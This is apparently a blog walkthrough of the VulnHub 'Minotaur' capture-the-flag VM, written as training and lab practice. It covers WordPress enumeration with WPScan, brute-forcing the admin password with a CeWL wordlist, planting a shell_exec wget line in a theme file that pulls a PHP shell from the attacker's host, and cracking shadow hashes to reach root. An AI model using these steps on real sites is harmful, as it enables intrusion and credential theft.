# Preface

Today i'm going to be attacking Minotaur, a VM which can be found at [https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/]. This wakthrough has some cultural references in it, as it started life on my internal wiki.

## Fixing The VM

So this VM needed a static IP address, and I'm not into that, so I cheated a little on this one:

* Set up forward and reverse DNS on my DNS server
* Assigned a fixed lease in my DHCP for the MAC to make FQDNs work
* Booted Gparted and edited the NIC back to using DHCP.
* Booted into Ubuntu recovery mode, installed open-vm-tools for ESXi to play nice
* Ran MySQL client and executed the following SQL query to fix the WP from using Static IPs on the 56 network:

`UPDATE wp_options SET option_value='http://192.168.1.44' WHERE option_id =1;`

I know this is quite a bit of extra work, but I do like to optimise things, and it keeps me active on both the Blue and Red side of networking/system administration. This is something my very good firend MrB3n [has](http://www.mrb3n.com/?cat=8) blooged about

Once that was done, I went off to see what I could find...

# Prerequisites

* [NMap](https://nmap.org)
* [Dirb](https://github.com/seifreed/dirb)
* [WPScan](git clone https://github.com/wpscanteam/wpscan.git)
* [CeWL](https://digi.ninja/projects/cewl.php#download)
* [John The Ripper Jumbo](http://www.openwall.com/john/)
* PHP Shell of choice

# Initial NMap Scan

Starting off with NMap:

```knightmare@kali:[~]$ sudo nmap -sSV -T5 minotaur.example.co.uk

Starting Nmap 7.10SVN ( https://nmap.org ) at 2016-04-13 15:10 BST
Nmap scan report for minotaur.example.co.uk (192.168.100.44)
Host is up (0.000046s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
2020/tcp open  ftp     vsftpd 2.0.8 or later
MAC Address: 00:0C:29:49:E8:02 (VMware)
Service Info: Host: minotaur; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.44 seconds```

Some services there, Apache seems to be worth a prod, so let's check it out.

# Hank Marvin

Apache is listening there, and FTP on a funny port. I'll take a dump (tee hee!) of the webserver:

```knightmare@kali:[~]$ links -dump http://minotaur.example.co.uk | head -n5
   Ubuntu Logo Apache2 Ubuntu Default Page
   It works!

   This is the default welcome page used to test the correct operation of the
   Apache2 server after installation on Ubuntu systems. It is based on the```

Hmm, basic apache page. At least it *feels* like Ubuntu now. time to abuse it with dirb.

# Raiding Barry Manilow's Wardrobe

Setting off dirb, we find something interesting. I've edited the output slightly here:

```knightmare@kali:[~/hack/web/dirb]$ ./dirb http://minotaur.example.co.uk wordlists/big.txt

----------------- DIRB v2.22 By The Dark Raver -----------------
START_TIME: Wed Apr 13 15:14:24 2016
URL_BASE: http://minotaur.example.co.uk/
WORDLIST_FILES: wordlists/big.txt
GENERATED WORDS: 20458

---- Scanning URL: http://minotaur.example.co.uk/ ----
==> DIRECTORY: http://minotaur.example.co.uk/bull/
+ http://minotaur.example.co.uk/server-status (CODE:403|SIZE:304)

---- Entering directory: http://minotaur.example.co.uk/bull/ ----
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-admin/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-content/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-includes/

---- Entering directory: http://minotaur.example.co.uk/bull/wp-admin/ ----
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-admin/css/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-admin/images/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-admin/includes/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-admin/js/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-admin/maint/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-admin/network/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-admin/user/

---- Entering directory: http://minotaur.example.co.uk/bull/wp-content/ ----
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-content/plugins/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-content/themes/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-content/uploads/

---- Entering directory: http://minotaur.example.co.uk/bull/wp-includes/ ----
---- Entering directory: http://minotaur.example.co.uk/bull/wp-admin/css/ ----
---- Entering directory: http://minotaur.example.co.uk/bull/wp-admin/images/ ----
---- Entering directory: http://minotaur.example.co.uk/bull/wp-admin/includes/ ----
---- Entering directory: http://minotaur.example.co.uk/bull/wp-admin/js/ ----
---- Entering directory: http://minotaur.example.co.uk/bull/wp-admin/maint/ ----
---- Entering directory: http://minotaur.example.co.uk/bull/wp-admin/network/ ----
---- Entering directory: http://minotaur.example.co.uk/bull/wp-admin/user/ ----
---- Entering directory: http://minotaur.example.co.uk/bull/wp-content/plugins/ ----

==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-content/plugins/akismet/
---- Entering directory: http://minotaur.example.co.uk/bull/wp-content/themes/ ----
---- Entering directory: http://minotaur.example.co.uk/bull/wp-content/uploads/ ----

---- Entering directory: http://minotaur.example.co.uk/bull/wp-content/plugins/akismet/ ----
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-content/plugins/akismet/_inc/
==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-content/plugins/akismet/views/

END_TIME: Wed Apr 13 15:15:03 2016
DOWNLOADED: 184122 - FOUND: 1```

So, under the bull subdirectory, we have what appears to be a wordpress install. Oh Joy!

# Don't mess with the bull young man, you'll get the horns!

So we can now fire WPScan and let it do the heavy lifting for us:

```knightmare@kali:[~/hack/web/wordpress/wpscan]$ ./wpscan.rb -e p,t,u -u http://minotaur.example.co.uk/bull
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o [A]bort, default: [N]y
[i] Updating the Database ...
[i] Update completed.
[+] URL: http://minotaur.example.co.uk/bull/
[+] Started: Wed Apr 13 15:39:27 2016

[!] The WordPress 'http://minotaur.example.co.uk/bull/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.4.7 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.5.9-1ubuntu4.6
[+] XML-RPC Interface available under: http://minotaur.example.co.uk/bull/xmlrpc.php
[!] Upload directory has directory listing enabled: http://minotaur.example.co.uk/bull/wp-content/uploads/

[+] WordPress version 4.2.2 identified from advanced fingerprinting
[!] 12 vulnerabilities identified from the version number

[!] Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8111
    Reference: https://wordpress.org/news/2015/07/wordpress-4-2-3/
    Reference: https://twitter.com/klikkioy/status/624264122570526720
    Reference: https://klikki.fi/adv/wordpress3.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
[i] Fixed in: 4.2.3

[!] Title: WordPress <= 4.2.3 - wp_untrash_post_comments SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8126
    Reference: https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Timing Side Channel Attack
    Reference: https://wpvulndb.com/vulnerabilities/8130
    Reference: https://core.trac.wordpress.org/changeset/33536
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8131
    Reference: https://core.trac.wordpress.org/changeset/33529
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Nav Menu Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8132
    Reference: https://core.trac.wordpress.org/changeset/33541
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5733
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8133
    Reference: https://core.trac.wordpress.org/changeset/33549
    Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8186
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - User List Table Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8187
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: https://github.com/WordPress/WordPress/commit/f91a5fd10ea7245e5b41e288624819a37adf290a
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7989
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - Publish Post and Mark as Sticky Permission Issue
    Reference: https://wpvulndb.com/vulnerabilities/8188
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5715
[i] Fixed in: 4.2.5

[!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8358
    Reference: https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
[i] Fixed in: 4.2.6

[!] Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8376
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36435
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
[i] Fixed in: 4.2.7

[!] Title: WordPress 3.7-4.4.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8377
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36444
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
[i] Fixed in: 4.2.7

[+] WordPress theme in use: twentyfourteen - v1.4

[+] Name: twentyfourteen - v1.4
 |  Location: http://minotaur.example.co.uk/bull/wp-content/themes/twentyfourteen/
[!] The version is out of date, the latest version is 1.7
 |  Style URL: http://minotaur.example.co.uk/bull/wp-content/themes/twentyfourteen/style.css
 |  Referenced style.css: http://192.168.56.223/bull/wp-content/themes/twentyfourteen/style.css
 |  Theme Name: Twenty Fourteen
 |  Theme URI: https://wordpress.org/themes/twentyfourteen/
 |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating installed plugins (only ones marked as popular) ...

   Time: 00:00:00 <=========================================================> (1000 / 1000) 100.00% Time: 00:00:00

[+] We found 2 plugins:

[+] Name: akismet - v3.1.1
 |  Location: http://minotaur.example.co.uk/bull/wp-content/plugins/akismet/
 |  Readme: http://minotaur.example.co.uk/bull/wp-content/plugins/akismet/readme.txt
[!] The version is out of date, the latest version is 3.1.10

[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8215
    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
[i] Fixed in: 3.1.5

[+] Name: slideshow-gallery - v1.4.6
 |  Location: http://minotaur.example.co.uk/bull/wp-content/plugins/slideshow-gallery/
 |  Readme: http://minotaur.example.co.uk/bull/wp-content/plugins/slideshow-gallery/readme.txt
[!] The version is out of date, the latest version is 1.6.3
[!] Directory listing is enabled: http://minotaur.example.co.uk/bull/wp-content/plugins/slideshow-gallery/

[!] Title: Slideshow Gallery < 1.4.7 Arbitrary File Upload
    Reference: https://wpvulndb.com/vulnerabilities/7532
    Reference: http://seclists.org/bugtraq/2014/Sep/1
    Reference: http://packetstormsecurity.com/files/131526/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
    Reference: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload
    Reference: https://www.exploit-db.com/exploits/34681/
    Reference: https://www.exploit-db.com/exploits/34514/
[i] Fixed in: 1.4.7

[!] Title: Tribulant Slideshow Gallery <= 1.5.3 - Arbitrary file upload & Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8263
    Reference: http://cinu.pl/research/wp-plugins/mail_5954cbf04cd033877e5415a0c6fba532.html
    Reference: http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html
[i] Fixed in: 1.5.3.4

[+] Enumerating installed themes (only ones marked as popular) ...

   Time: 00:00:00 <===========================================================> (400 / 400) 100.00% Time: 00:00:00

[+] No themes found

[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-------+-------+
    | Id | Login | Name  |
    +----+-------+-------+
    | 1  | bully | bully |
    +----+-------+-------+

[+] Finished: Wed Apr 13 15:39:33 2016
[+] Requests Done: 1476
[+] Memory used: 118.477 MB
[+] Elapsed time: 00:00:06```

Pfft! Hadly worth getting out of bed for... Still, it's a foothold into the server.

# Like Totally! Tubular wordlists

So we can now use CeWL to create a custom wordlist from the site:

```knightmare@kali:[~/hack/passwords/cewl]$ ./cewl.rb -m 4 -w ../minotaur_dict.txt http://minotaur.example.co.uk/bull
CeWL 5.1 Robin Wood (robin@digi.ninja) (http://digi.ninja)
knightmare@kali:[~/hack/passwords/cewl]$ cd .. ; wc -l minotaur_dict.txt
116 minotaur_dict.txt```

Now we'll pass that wordlist into John The Ripper and mangle it up a little:

```knightmare@kali:[~/hack/passwords/john-1.8.0-jumbo-1/run]$ ./john --wordlist=../../minotaur_dict.txt --rules --stdout > ../../minotaur_dict2.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
5784p 0:00:00:00 100.00% (2016-04-13 15:51) 11568p/s Platforming```

# Wordsmith

So now we will try again with our custom wordlist: I've edited it for brevity in reading this article:

```knightmare@kali:[~/hack/web/wordpress/wpscan]$ ./wpscan.rb -U bully -w ~/hack/passwords/minotaur_dict2.txt -u http://minotaur.example.co.uk/bull
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://minotaur.example.co.uk/bull/
[+] Started: Wed Apr 13 15:53:47 2016

[!] The WordPress 'http://minotaur.example.co.uk/bull/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.4.7 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.5.9-1ubuntu4.6
[+] XML-RPC Interface available under: http://minotaur.example.co.uk/bull/xmlrpc.php
[!] Upload directory has directory listing enabled: http://minotaur.example.co.uk/bull/wp-content/uploads/
{+] <<snip>>
[+] Enumerating plugins from passive detection...
[+] No plugins found
[+] Starting the password brute forcer
  Brute Forcing 'bully' Time: 00:01:37 <==================================== > (5781 / 5785) 99.93%  ETA: 00:00:00

  +----+-------+------+----------------+
  | Id | Login | Name | Password       |
  +----+-------+------+----------------+
  |    | bully |      | Bighornedbulls |
  +----+-------+------+----------------+

[+] Finished: Wed Apr 13 15:55:28 2016
[+] Requests Done: 5831
[+] Memory used: 32.254 MB
[+] Elapsed time: 00:01:41```

Now we an log into wordpress and try to gain the flag(s):

# Stepping Up

So browsing to `http://minotaur.example.co.uk/bull/` and logging in let us log in with the credentials.

# Style Council

Now we can click on `Apperance > Editor >  Main Index Template` (index.php) and put in some PHP code:

`shell_exec("wget http://192.168.100.190:8000/knightmare_shell.php");`

In our shell (Oh Michelle!):

```knightmare@kali:[~/hack/web/shells/phpshells]$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.100.44 - - [13/Apr/2016 17:01:31] "GET /knightmare_shell.php HTTP/1.1" 200 -```

Browsing to `http://minotaur.example.co.uk/bull/wp-content/themes/twentyfourteen/` triggers the download, although it gives a blank page.

We can now browse to `http://minotaur.example.co.uk/bull/wp-content/themes/twentyfourteen/knightmare_shell.php` and get the action going!

# Quick Leg Up

Now we have a shell, we can jump to the terminal page in the shell, and do some enumaration:

```/var/www/html/bull/> cd ...
/var/www/html/>ls
bull
flag.txt
index.html

/var/www/html/>cat flag.txt
Oh, lookey here. A flag!
Th15 15 @N 3@5y f1@G!
/var/www/html/>	```

That's Interesting, but of no use to us. Let's do some basic enumeration:

```/var/www/html/>
/tmp/>cat flag.txt
That shadow.bak file is probably useful, hey?
Also, you found a flag!
My m1L|<$|-|@|<3 br1|\|G$ @11 t3h b0y$ 2 t3h y@R|)

/tmp/>file shadow.bak
shadow.bak: ASCII text

/tmp/>cat shadow.bak
root:$6$15/OlfJP$h70tk3qikcf.kfwlGpYT7zfFg.cRzlJMlbVDSj3zCg4967ZXG0JzN/6oInrnvGf7AZaJFE2qJdBAOc/3AyeGX.:16569:0:99999:7:::
daemon:*:16484:0:99999:7:::
bin:*:16484:0:99999:7:::
sys:*:16484:0:99999:7:::
sync:*:16484:0:99999:7:::
games:*:16484:0:99999:7:::
man:*:16484:0:99999:7:::
lp:*:16484:0:99999:7:::
mail:*:16484:0:99999:7:::
news:*:16484:0:99999:7:::
uucp:*:16484:0:99999:7:::
proxy:*:16484:0:99999:7:::
www-data:*:16484:0:99999:7:::
backup:*:16484:0:99999:7:::
list:*:16484:0:99999:7:::
irc:*:16484:0:99999:7:::
gnats:*:16484:0:99999:7:::
nobody:*:16484:0:99999:7:::
libuuid:!:16484:0:99999:7:::
syslog:*:16484:0:99999:7:::
mysql:!:16569:0:99999:7:::
messagebus:*:16569:0:99999:7:::
landscape:*:16569:0:99999:7:::
sshd:*:16569:0:99999:7:::
minotaur:$6$3qaiXwrS$1Ctbj1UPpzKjWSgpIaUH0PovtO2Ar/IshWUe4tIUrJf8VlbIIijxdu4xHsXltA0mFavbo701X9.BG/fVIPD35.:16582:0:99999:7:::
ftp:*:16573:0:99999:7:::
heffer:$6$iH6pqgzM$3nJ00ToM38a.qLqcW8Yv0pdRiO/fXOvNv03rBzv./E0TO4B8y.QF/PNZ2JrghQTZomdVl3Zffb/MkWrFovWUi/:16582:0:99999:7:::
h0rnbag:$6$nlapGOqY$Hp5VHWq388mVQemkiJA2U1qLI.rZAFzxCw7ivfyglRNgZ6mx68sE1futUy..m7dYJRQRUWEpm3XKihXPB9Akd1:16582:0:99999:7:::

/tmp/>cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
minotaur:x:1000:1000:minotaur,,,:/home/minotaur:/bin/bash
ftp:x:106:114:ftp daemon,,,:/srv/ftp:/bin/false
heffer:x:1001:1001:,,,:/home/heffer:/bin/bash
h0rnbag:x:1002:1002:,,,:/home/h0rnbag:/bin/bash
/tmp/>	
```

Oh dear! Password file right there in plain text. Well, that's just not cricket! Only thing to do now, is to crack those hashes:

```knightmare@kali:[~/hack/passwords/john-1.8.0-jumbo-1/run]$ ./unshadow /tmp/passwd /tmp/shadow > /tmp/minotaur
knightmare@kali:[~/hack/passwords/john-1.8.0-jumbo-1/run]$ ./john /tmp/minotaur
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 64/64 OpenSSL])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (heffer)
obiwan6          (minotaur)
<<output omitted for brevity>>
```

Hmm, so we now have a couple of logins. Let's test them.

# Front Door

Logging in as heffer:

```knightmare@kali:[~]$ ssh heffer@minotaur.example.co.uk
heffer@minotaur.example.co.uk's password:
Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.16.0-30-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Thu Apr 14 01:46:57 AEST 2016

  System load:  0.32              Processes:           104
  Usage of /:   90.2% of 1.41GB   Users logged in:     0
  Memory usage: 12%               IP address for eth0: 192.168.100.44
  Swap usage:   0%

  => / is using 90.2% of 1.41GB

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Wed May 27 16:57:26 2015
heffer@minotaur:~$ ls -la
total 32
drwx------ 3 heffer heffer 4096 Apr 14 02:23 .
drwxr-xr-x 5 root   root   4096 May 27  2015 ..
lrwxrwxrwx 1 heffer heffer    9 May 27  2015 .bash_history -> /dev/null
-rw-r--r-- 1 heffer heffer  220 May 27  2015 .bash_logout
-rw-r--r-- 1 heffer heffer 3637 May 27  2015 .bashrc
drwx------ 2 heffer heffer 4096 May 27  2015 .cache
-rw------- 1 heffer heffer  107 May 27  2015 flag.txt
-rw-r--r-- 1 heffer heffer  675 May 27  2015 .profile
-rw------- 1 heffer heffer   54 Apr 14 02:23 .Xauthority
heffer@minotaur:~$ cat flag.txt
So this was an easy flag to get, hopefully. Have you gotten ~minotaur/flag.txt yet?
Th3 fl@G 15: m00000 y0```

Hmm, so we need to check on some things. Luck for us we have the other password :-)

```heffer@minotaur:~$ su minotaur
Password:
minotaur@minotaur:/home/heffer$ id
uid=1000(minotaur) gid=1000(minotaur) groups=1000(minotaur),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),112(lpadmin),113(sambashare)
minotaur@minotaur:/home/heffer$ cd
minotaur@minotaur:~$ ls
flag.txt  peda
minotaur@minotaur:~$ cat flag.txt
Congrats! You've found the first flag:
M355 W17H T3H 8ULL, G37 73H H0RN!

But can you get /root/flag.txt ?```

So we need a way to become root. Dang!

# Closing In

So let's now enumerate what the minotaur user can do:

```minotaur@minotaur:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.2 LTS
Release:        14.04
Codename:       trusty
minotaur@minotaur:~$ which gcc
/usr/bin/gcc```

We could, at this point, use the Ubuntu overlay exploit ere, but let's not:

```minotaur@minotaur:~$ sudo -l
Matching Defaults entries for minotaur on minotaur:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User minotaur may run the following commands on minotaur:
    (root) NOPASSWD: /root/bullquote.sh
    (ALL : ALL) ALL
minotaur@minotaur:~$ sudo -s
[sudo] password for minotaur:
root@minotaur:~# cd /root/
root@minotaur:/root# ls
flag.txt  peda  quotes.txt
root@minotaur:/root# cat flag.txt
Congrats! You got the final flag!
Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35```

Tsk! Was easy in the end... Still one more notch on the keyboard case. With many thanks to [https://twitter.com/@RobertWinkel] (Robert Winkel) for this VM.

